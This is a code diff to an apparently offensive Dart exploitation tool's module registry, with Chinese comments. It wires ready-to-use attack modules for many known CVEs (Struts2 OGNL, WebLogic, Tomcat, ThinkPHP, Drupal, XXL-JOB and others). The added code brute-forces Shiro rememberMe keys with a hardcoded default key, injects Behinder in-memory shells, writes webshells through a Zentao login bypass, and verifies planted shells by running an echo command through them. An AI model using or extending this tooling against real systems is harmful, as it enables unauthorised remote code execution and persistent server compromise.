@@ -3,7 +3,10 @@
 /// 目标：新增/调整一个 CVE 只需要在这里加一条，UI 不用改。
 library;
 
+import 'dart:convert';
 import 'dart:typed_data';
+
+import 'package:http/http.dart' as http;
 
 import '../shiro/shiro_crypto.dart';
 import '../shiro/shiro_exp_service.dart';
@@ -19,6 +22,7 @@ import '../vulhub/services/xxljob_exp_service.dart';
 import '../vulhub/spring_exp_service.dart';
 import '../vulhub/struts2_exp_service.dart';
 import '../zentao/zentao_exp_service.dart';
+import 'exploit_error.dart';
 import 'exploit_module.dart';
 import 'shell_deployer.dart';
 
@@ -34,6 +38,75 @@ ExploitOutcome _fromTp(ThinkphpResult r) {
   if (r.failed) return ExploitOutcome.probeFailed(r.vulnName, r.detail);
   if (r.vulnerable) return ExploitOutcome.vulnerable(r.vulnName, r.detail);
   return ExploitOutcome.notDetected(r.vulnName, r.detail);
+}
+
+/// 原生写马后必须验证 shell 真的可用再返回。
+///
+/// 实测：ThinkPHP 的 getShell 一写完就返回 URL，紧接着连接会 404（文件刚落地、
+/// 或被路由/缓存挡了一下）。"拿到 URL"不等于"拿到 shell"，必须回显验证。
+Future<ShellSession?> _verifiedShell(
+  ShellSession session, {
+  Duration timeout = const Duration(seconds: 8),
+  int attempts = 10,
+}) async {
+  final param = session.password.isEmpty ? 'c' : session.password;
+  const probe = 'echo MX_SHELL_VERIFY';
+  for (var i = 0; i < attempts; i++) {
+    try {
+      final uri = Uri.parse(session.url);
+      final params = {...uri.queryParameters, param: probe};
+      final res = await http
+          .get(uri.replace(queryParameters: params))
+          .timeout(timeout);
+      if (res.statusCode == 200 && res.body.contains('MX_SHELL_VERIFY')) {
+        return session;
+      }
+    } catch (_) {
+      // 再试
+    }
+    await Future<void>.delayed(const Duration(milliseconds: 500));
+  }
+  return null;
+}
+
+/// Shiro 加密模式：'gcm' → GCM，其余一律 CBC。
+ShiroEncryptionMode _shiroMode(String? raw) =>
+    (raw ?? '').trim().toLowerCase() == 'gcm'
+        ? ShiroEncryptionMode.gcm
+        : ShiroEncryptionMode.cbc;
+
+/// 内存马类型：filter / valve / listener。
+MemShellType _memShellType(String? raw) => switch ((raw ?? '').trim()) {
+  'valve' => MemShellType.valve,
+  'listener' => MemShellType.listener,
+  _ => MemShellType.filter,
+};
+
+/// Shiro 的连接与会话参数全部来自 spec 字段。
+ShiroExpService _shiroService(ExploitTarget t) {
+  // 注意：不能写成 `(t['x'] ?? '默认').isEmpty ? '默认' : t['x']!.trim()`——
+  // 值为 null 时第一个分支为 false，会走到 `!` 直接崩。
+  final method = (t['method'] ?? '').trim();
+  final cookie = (t['cookieName'] ?? '').trim();
+  return ShiroExpService(
+    url: t.url,
+    method: method.isEmpty ? 'GET' : method.toUpperCase(),
+    cookieName: cookie.isEmpty ? 'rememberMe' : cookie,
+    timeout: t.timeout,
+  );
+}
+
+/// 用户填了 payload 就用它，否则用内置主链。
+Future<List<int>> _shiroPayload(ExploitTarget t) async {
+  final custom = (t['payload'] ?? '').trim();
+  if (custom.isNotEmpty) return base64Decode(custom.replaceAll(RegExp(r'\s'), ''));
+  return const ShiroPayloadRepo().loadPayload('shiro_payload_principal.b64');
+}
+
+/// 取用户填的 path；为空时回退到该变体的历史默认值。
+String _pathOr(ExploitTarget t, String fallback) {
+  final p = (t['path'] ?? '').trim();
+  return p.isEmpty ? fallback : p;
 }
 
 /// 通用模块：检测/执行/取 shell 由回调提供；取 shell 未实现时回退到
@@ -94,6 +167,9 @@ class SimpleExploitModule extends ExploitModule {
       targetUrl: target.url,
       exec: (cmd) => exec(target, cmd),
       kind: kind,
+      preferredDirectory: target['path']?.trim().isEmpty ?? true
+          ? null
+          : target['path']!.trim(),
       serverHint: shellHint ?? kind.name,
       timeout: target.timeout,
     );
@@ -132,9 +208,9 @@ List<ExploitModule> _struts2Modules() => [
     cve: 'CVE-2010-1870',
     description: '参数名 OGNL 注入；回显依赖 POST PoC（部分链路盲打）。',
     checkFn: (t) async => _fromExp(
-      await Struts2ExpService(url: t.url).checkS2005(),
+      await Struts2ExpService(url: t.url, timeout: t.timeout).checkS2005(path: _pathOr(t, '')),
     ),
-    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2005(cmd),
+    execFn: (t, cmd) => Struts2ExpService(url: t.url, timeout: t.timeout).execS2005(cmd, path: _pathOr(t, 'example/HelloWorld.action')),
     shellKind: ShellKind.jsp,
   ),
   SimpleExploitModule(
@@ -144,9 +220,9 @@ List<ExploitModule> _struts2Modules() => [
     cve: 'S2-007',
     description: '表单类型转换拼接 OGNL；自动尝试 user.action/login.action 等入口。',
     checkFn: (t) async => _fromExp(
-      await Struts2ExpService(url: t.url).checkS2007(),
+      await Struts2ExpService(url: t.url, timeout: t.timeout).checkS2007(path: _pathOr(t, '')),
     ),
-    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2007(cmd),
+    execFn: (t, cmd) => Struts2ExpService(url: t.url, timeout: t.timeout).execS2007(cmd, path: _pathOr(t, '')),
     shellKind: ShellKind.jsp,
   ),
   SimpleExploitModule(
@@ -156,9 +232,9 @@ List<ExploitModule> _struts2Modules() => [
     cve: 'CVE-2016-3081',
     description: '动态方法调用 OGNL 注入，带命令回显。',
     checkFn: (t) async => _fromExp(
-      await Struts2ExpService(url: t.url).checkS2032(),
+      await Struts2ExpService(url: t.url, timeout: t.timeout).checkS2032(),
     ),
-    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2032(cmd),
+    execFn: (t, cmd) => Struts2ExpService(url: t.url, timeout: t.timeout).execS2032(cmd),
     shellKind: ShellKind.jsp,
   ),
   SimpleExploitModule(
@@ -168,9 +244,9 @@ List<ExploitModule> _struts2Modules() => [
     cve: 'CVE-2017-5638',
     description: 'Content-Type 头 OGNL 注入，回显在响应体。',
     checkFn: (t) async => _fromExp(
-      await Struts2ExpService(url: t.url).checkS2045(),
+      await Struts2ExpService(url: t.url, timeout: t.timeout).checkS2045(),
     ),
-    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2045(cmd),
+    execFn: (t, cmd) => Struts2ExpService(url: t.url, timeout: t.timeout).execS2045(cmd),
     shellKind: ShellKind.jsp,
   ),
   SimpleExploitModule(
@@ -180,12 +256,12 @@ List<ExploitModule> _struts2Modules() => [
     cve: 'S2-052',
     description: 'REST 插件 XStream 反序列化，盲打无回显。',
     checkFn: (t) async => _fromExp(
-      await Struts2ExpService(url: t.url).checkS2052(),
+      await Struts2ExpService(url: t.url, timeout: t.timeout).checkS2052(path: _pathOr(t, 'orders/3/edit')),
     ),
-    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2052(cmd),
+    execFn: (t, cmd) => Struts2ExpService(url: t.url, timeout: t.timeout).execS2052(cmd, path: _pathOr(t, 'orders/3/edit')),
     shellFn: (t) async => ShellDeployer.deploy(
       targetUrl: t.url,
-      exec: (cmd) => Struts2ExpService(url: t.url).execS2052(cmd),
+      exec: (cmd) => Struts2ExpService(url: t.url, timeout: t.timeout).execS2052(cmd, path: _pathOr(t, 'orders/3/edit')),
       kind: ShellKind.jsp,
       blind: true,
       timeout: t.timeout,
@@ -198,9 +274,9 @@ List<ExploitModule> _struts2Modules() => [
     cve: 'S2-053',
     description: 'Freemarker 模板二次 OGNL 求值。',
     checkFn: (t) async => _fromExp(
-      await Struts2ExpService(url: t.url).checkS2053(),
+      await Struts2ExpService(url: t.url, timeout: t.timeout).checkS2053(path: _pathOr(t, 'hello.action')),
     ),
-    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2053(cmd),
+    execFn: (t, cmd) => Struts2ExpService(url: t.url, timeout: t.timeout).execS2053(cmd, path: _pathOr(t, 'hello.action')),
     shellKind: ShellKind.jsp,
   ),
   SimpleExploitModule(
@@ -210,9 +286,9 @@ List<ExploitModule> _struts2Modules() => [
     cve: 'CVE-2018-11776',
     description: 'Namespace OGNL 注入，输出在 Location 头。',
     checkFn: (t) async => _fromExp(
-      await Struts2ExpService(url: t.url).checkS2057(),
+      await Struts2ExpService(url: t.url, timeout: t.timeout).checkS2057(path: _pathOr(t, 'struts2-showcase')),
     ),
-    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2057(cmd),
+    execFn: (t, cmd) => Struts2ExpService(url: t.url, timeout: t.timeout).execS2057(cmd, path: _pathOr(t, 'struts2-showcase')),
     shellKind: ShellKind.jsp,
   ),
   SimpleExploitModule(
@@ -222,9 +298,9 @@ List<ExploitModule> _struts2Modules() => [
     cve: 'CVE-2019-0230',
     description: '标签属性二次 OGNL；执行链分两步清沙箱后回显。',
     checkFn: (t) async => _fromExp(
-      await Struts2ExpService(url: t.url).checkS2059(),
+      await Struts2ExpService(url: t.url, timeout: t.timeout).checkS2059(),
     ),
-    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2059(cmd),
+    execFn: (t, cmd) => Struts2ExpService(url: t.url, timeout: t.timeout).execS2059(cmd),
     shellKind: ShellKind.jsp,
   ),
 ];
@@ -245,8 +321,8 @@ List<ExploitModule> _springModules() {
     cve: cve,
     description: desc,
     checkFn: (t) async =>
-        _fromExp(await SpringExpService(url: t.url).checkSingle(type)),
-    execFn: (t, cmd) => SpringExpService(url: t.url).execRce(type, cmd),
+        _fromExp(await SpringExpService(url: t.url, timeout: t.timeout, credentials: t['creds'] ?? '').checkSingle(type)),
+    execFn: (t, cmd) => SpringExpService(url: t.url, timeout: t.timeout, credentials: t['creds'] ?? '').execRce(type, cmd),
     shellKind: ShellKind.jsp,
   );
 
@@ -299,8 +375,8 @@ List<ExploitModule> _phpModules() => [
     cve: 'PHP 8.1.0-dev backdoor',
     description: 'User-Agentt 头后门；命令载荷用变量函数规避关键词规则。',
     checkFn: (t) async =>
-        _fromExp(await PhpBackdoorExpService(baseUrl: t.url).check()),
-    execFn: (t, cmd) => PhpBackdoorExpService(baseUrl: t.url).execRce(cmd),
+        _fromExp(await PhpBackdoorExpService(baseUrl: t.url, timeout: t.timeout, phpPath: t['phpPath'] ?? '/index.php').check()),
+    execFn: (t, cmd) => PhpBackdoorExpService(baseUrl: t.url, timeout: t.timeout, phpPath: t['phpPath'] ?? '/index.php').execRce(cmd),
     shellKind: ShellKind.php,
   ),
   SimpleExploitModule(
@@ -310,8 +386,8 @@ List<ExploitModule> _phpModules() => [
     cve: 'CVE-2012-1823',
     description: 'php-cgi 查询串参数注入，支持命令执行。',
     checkFn: (t) async =>
-        _fromExp(await PhpCgiExpService(baseUrl: t.url).check()),
-    execFn: (t, cmd) => PhpCgiExpService(baseUrl: t.url).execRce(cmd),
+        _fromExp(await PhpCgiExpService(baseUrl: t.url, timeout: t.timeout).check()),
+    execFn: (t, cmd) => PhpCgiExpService(baseUrl: t.url, timeout: t.timeout).execRce(cmd),
     shellKind: ShellKind.php,
   ),
 ];
@@ -324,10 +400,10 @@ ExploitModule _tomcatModule() => SimpleExploitModule(
   category: 'Tomcat',
   cve: 'CVE-2017-12615',
   description: 'readonly=false 时 PUT 写 JSP 并执行；原生 getShell。',
-  checkFn: (t) async => _fromExp(await TomcatExpService(baseUrl: t.url).check()),
-  execFn: (t, cmd) => TomcatExpService(baseUrl: t.url).execRce(cmd),
+  checkFn: (t) async => _fromExp(await TomcatExpService(baseUrl: t.url, timeout: t.timeout).check()),
+  execFn: (t, cmd) => TomcatExpService(baseUrl: t.url, timeout: t.timeout).execRce(cmd),
   shellFn: (t) async {
-    final url = await TomcatExpService(baseUrl: t.url).getShell();
+    final url = await TomcatExpService(baseUrl: t.url, timeout: t.timeout).getShell();
     if (url == null) return null;
     return ShellSession(
       url: url,
@@ -351,10 +427,10 @@ List<ExploitModule> _weblogicModules() => [
     cve: 'CVE-2017-10271',
     description: '/wls-wsat XMLDecoder 反序列化。',
     checkFn: (t) async => _fromExp(
-      await WebLogicExpService(baseUrl: t.url).checkCve201710271(),
+      await WebLogicExpService(baseUrl: t.url, timeout: t.timeout).checkCve201710271(),
     ),
     execFn: (t, cmd) =>
-        WebLogicExpService(baseUrl: t.url).execRceCve201710271(cmd),
+        WebLogicExpService(baseUrl: t.url, timeout: t.timeout).execRceCve201710271(cmd),
     shellKind: ShellKind.jsp,
   ),
   SimpleExploitModule(
@@ -364,10 +440,10 @@ List<ExploitModule> _weblogicModules() => [
     cve: 'CVE-2020-14882',
     description: '控制台路径绕过；严格 TLS 优先，自签证书时放宽并标注。',
     checkFn: (t) async => _fromExp(
-      await WebLogicExpService(baseUrl: t.url).checkCve202014882(),
+      await WebLogicExpService(baseUrl: t.url, timeout: t.timeout).checkCve202014882(),
     ),
     execFn: (t, cmd) =>
-        WebLogicExpService(baseUrl: t.url).execRceCve202014882(cmd),
+        WebLogicExpService(baseUrl: t.url, timeout: t.timeout).execRceCve202014882(cmd),
     shellKind: ShellKind.jsp,
   ),
 ];
@@ -381,8 +457,8 @@ ExploitModule _httpdModule() => SimpleExploitModule(
   cve: 'CVE-2021-41773',
   description: '路径穿越读文件；CGI 开启时可命令执行。',
   checkFn: (t) async =>
-      _fromExp(await ApacheHttpdExpService(baseUrl: t.url).check()),
-  execFn: (t, cmd) => ApacheHttpdExpService(baseUrl: t.url).execRce(cmd),
+      _fromExp(await ApacheHttpdExpService(baseUrl: t.url, timeout: t.timeout).check()),
+  execFn: (t, cmd) => ApacheHttpdExpService(baseUrl: t.url, timeout: t.timeout).execRce(cmd),
 );
 
 ExploitModule _drupalModule() => SimpleExploitModule(
@@ -392,8 +468,8 @@ ExploitModule _drupalModule() => SimpleExploitModule(
   cve: 'CVE-2018-7600',
   description: 'Form API #post_render 注入；未安装的站点会报"未安装"。',
   checkFn: (t) async =>
-      _fromExp(await DrupalExpService(baseUrl: t.url).check()),
-  execFn: (t, cmd) => DrupalExpService(baseUrl: t.url).execRce(cmd),
+      _fromExp(await DrupalExpService(baseUrl: t.url, timeout: t.timeout).check()),
+  execFn: (t, cmd) => DrupalExpService(baseUrl: t.url, timeout: t.timeout).execRce(cmd),
   shellKind: ShellKind.php,
 );
 
@@ -404,7 +480,7 @@ ExploitModule _nacosModule() => SimpleExploitModule(
   cve: 'CVE-2021-29441',
   description: 'User-Agent 绕过鉴权读取用户列表（可作为后续 Derby RCE 入口）。',
   checkFn: (t) async =>
-      _fromExp(await NacosExpService(baseUrl: t.url).check()),
+      _fromExp(await NacosExpService(baseUrl: t.url, timeout: t.timeout).check()),
 );
 
 ExploitModule _xxlJobModule() => SimpleExploitModule(
@@ -414,8 +490,8 @@ ExploitModule _xxlJobModule() => SimpleExploitModule(
   cve: 'XXL-JOB unauthenticated RCE',
   description: '执行器 /run 未授权调用（GLUE_SHELL）；目标应填执行器端口。',
   checkFn: (t) async =>
-      _fromExp(await XxlJobExpService(baseUrl: t.url).check()),
-  execFn: (t, cmd) => XxlJobExpService(baseUrl: t.url).execRce(cmd),
+      _fromExp(await XxlJobExpService(baseUrl: t.url, timeout: t.timeout).check()),
+  execFn: (t, cmd) => XxlJobExpService(baseUrl: t.url, timeout: t.timeout).execRce(cmd),
 );
 
 // ── ThinkPHP ──────────────────────────────────────────────────────────────────
@@ -434,14 +510,15 @@ List<ExploitModule> _thinkphpModules() {
     cve: cve,
     description: desc,
     checkFn: (t) async =>
-        _fromTp(await ThinkphpExpService(url: t.url).checkSingle(type)),
-    execFn: (t, cmd) => ThinkphpExpService(url: t.url).exeRce(type, cmd),
+        _fromTp(await ThinkphpExpService(url: t.url, timeout: t.timeout).checkSingle(type)),
+    execFn: (t, cmd) => ThinkphpExpService(url: t.url, timeout: t.timeout).exeRce(type, cmd),
     shellFn: (t) async {
       final url = await ThinkphpExpService(
         url: t.url,
+        timeout: t.timeout,
       ).getShell(type, _phpShell, password: 'c');
       if (url == null) return null;
-      return ShellSession(
+      return _verifiedShell(ShellSession(
         url: url,
         password: 'c',
         kind: 'php',
@@ -449,7 +526,7 @@ List<ExploitModule> _thinkphpModules() {
         type: 'php',
         method: 'GET',
         note: 'ThinkPHP 原生写马',
-      );
+      ));
     },
   );
 
@@ -488,35 +565,71 @@ ExploitModule _shiroModule() => SimpleExploitModule(
   description: '爆破 rememberMe key 并注入 Behinder 内存马（参考 shiro 原生实现）。',
   checkFn: (t) async {
     try {
-      final ok = await ShiroExpService(url: t.url).checkIsShiro();
-      return ok
-          ? const ExploitOutcome.vulnerable(
-              'Shiro rememberMe',
-              '响应中出现 rememberMe=deleteMe，目标使用 Shiro',
-            )
-          : const ExploitOutcome.notDetected('Shiro rememberMe', '');
+      final svc = _shiroService(t);
+      final ok = await svc.checkIsShiro();
+      if (!ok) {
+        return const ExploitOutcome.notDetected('Shiro rememberMe', '');
+      }
+      // 指纹命中只是"目标用了 Shiro"，不等于能打——打过补丁的 Shiro 一样回 deleteMe。
+      // 真信号是"用这个 key 能伪造 rememberMe 且 deleteMe 下降"。
+      final payload = await _shiroPayload(t);
+      final providedKey = (t['key'] ?? '').trim();
+      final key = providedKey.isNotEmpty
+          ? providedKey
+          : 'kPH+bIxk5D2deZiIxcaaaA==';
+      final verified = await svc.verifyKey(
+        keyBase64: key,
+        serializedPayload: payload,
+        mode: _shiroMode(t['mode']),
+      );
+      if (!verified) {
+        return ExploitOutcome.notDetected(
+          'Shiro rememberMe',
+          providedKey.isEmpty
+              ? '目标是 Shiro，但默认 key 无法伪造（可能已改 key 或已修补）'
+              : '目标是 Shiro，但指定的 key 无法伪造',
+        );
+      }
+      return ExploitOutcome.vulnerable(
+        'Shiro rememberMe',
+        '${_shiroMode(t['mode']).name.toUpperCase()} 下 key 可伪造（key=$key）',
+      );
+    } on ExploitBlocked catch (e) {
+      // 被拦下时不能报"不是 Shiro"，否则扫描会当成"没漏洞"。
+      return ExploitOutcome.probeFailed('Shiro rememberMe', '$e');
     } catch (e) {
       return ExploitOutcome.probeFailed('Shiro rememberMe', '$e');
     }
   },
   shellFn: (t) async {
     final repo = const ShiroPayloadRepo();
-    final keys = await repo.loadKeys();
+    final providedKey = (t['key'] ?? '').trim();
+    final keys = providedKey.isNotEmpty
+        ? <String>[providedKey]
+        : await repo.loadKeys();
     if (keys.isEmpty) return null;
-    final payload = await repo.loadPayload('shiro_payload_principal.b64');
-    final svc = ShiroExpService(url: t.url, timeout: t.timeout);
+    final payload = await _shiroPayload(t);
+    final mode = _shiroMode(t['mode']);
+    final svc = _shiroService(t);
+    final verbose = (t['verbose'] ?? 'false') == 'true';
     final key = await svc.bruteForceKey(
       candidateKeysBase64: keys,
       serializedPayload: payload,
-      mode: ShiroEncryptionMode.cbc,
+      mode: mode,
+      verbose: verbose,
     );
     if (key == null) return null;
 
     final token = DateTime.now().millisecondsSinceEpoch.toRadixString(16);
-    final path = '/mx$token.ico';
-    final password = 'mx$token';
+    final rawPassword = (t['shellPassword'] ?? '').trim();
+    final password = rawPassword.isNotEmpty ? rawPassword : 'mx$token';
+    final rawPath = (t['shellPath'] ?? '').trim();
+    final path = rawPath.isNotEmpty
+        ? (rawPath.startsWith('/') ? rawPath : '/$rawPath')
+        : '/mx$token.ico';
+    final type = _memShellType(t['memshell']);
     final bytes = await const ShiroMemShellService().buildShellClass(
-      type: MemShellType.filter,
+      type: type,
       password: password,
       path: path,
     );
@@ -526,7 +639,12 @@ ExploitModule _shiroModule() => SimpleExploitModule(
       shellClassBytes: Uint8List.fromList(bytes),
       shellPath: path,
       shellPassword: password,
-      mode: ShiroEncryptionMode.cbc,
+      mode: mode,
+      cookieName: () {
+        final c = (t['cookieName'] ?? '').trim();
+        return c.isEmpty ? 'rememberMe' : c;
+      }(),
+      timeout: t.timeout,
     );
     if (!result.success) return null;
     final base = Uri.parse(t.url);
@@ -537,7 +655,7 @@ ExploitModule _shiroModule() => SimpleExploitModule(
       connectorType: 'jsp_behinder',
       type: 'jsp',
       method: 'POST',
-      note: 'Shiro 内存马（Behinder filter），key=$key',
+      note: 'Shiro 内存马（${type.displayName}），key=$key',
     );
   },
 );
@@ -552,11 +670,14 @@ ExploitModule _zentaoModule() => SimpleExploitModule(
   description: '绕过登录后通过 Repo 配置写入 Behinder WebShell。',
   checkFn: (t) async {
     try {
-      final base = await ZentaoExpService.detectZentaoBase(t.url);
+      final base = await ZentaoExpService.detectZentaoBase(
+        t.url,
+        timeout: t.timeout,
+      );
       if (base == null) {
         return const ExploitOutcome.notDetected('Zentao', '未识别到禅道入口');
       }
-      final svc = ZentaoExpService(url: base);
+      final svc = ZentaoExpService(url: base, timeout: t.timeout);
       final sid = await svc.tryBypassLogin();
       return sid == null
           ? const ExploitOutcome.notDetected('Zentao', '登录绕过失败')
@@ -564,24 +685,33 @@ ExploitModule _zentaoModule() => SimpleExploitModule(
               'CVE-2024-24216',
               '登录绕过成功（拿到 zentaosid）',
             );
+    } on ExploitBlocked catch (e) {
+      return ExploitOutcome.probeFailed('Zentao', '$e');
     } catch (e) {
       return ExploitOutcome.probeFailed('Zentao', '$e');
     }
   },
   shellFn: (t) async {
-    final base = await ZentaoExpService.detectZentaoBase(t.url);
+    final base = await ZentaoExpService.detectZentaoBase(
+      t.url,
+      timeout: t.timeout,
+    );
     if (base == null) return null;
     final url = await ZentaoExpService(
       url: base,
+      timeout: t.timeout,
     ).getShell(shellContent: _phpShell);
     if (url == null) return null;
-    return ShellSession(
-      url: url,
-      password: 'c',
-      kind: 'php',
-      connectorType: 'php_passthru',
-      type: 'php',
-      method: 'GET',
+    // 原生写马必须回显验证（与 ThinkPHP 同一标准）。
+    return _verifiedShell(
+      ShellSession(
+        url: url,
+        password: 'c',
+        kind: 'php',
+        connectorType: 'php_passthru',
+        type: 'php',
+        method: 'GET',
+      ),
     );
   },
 );
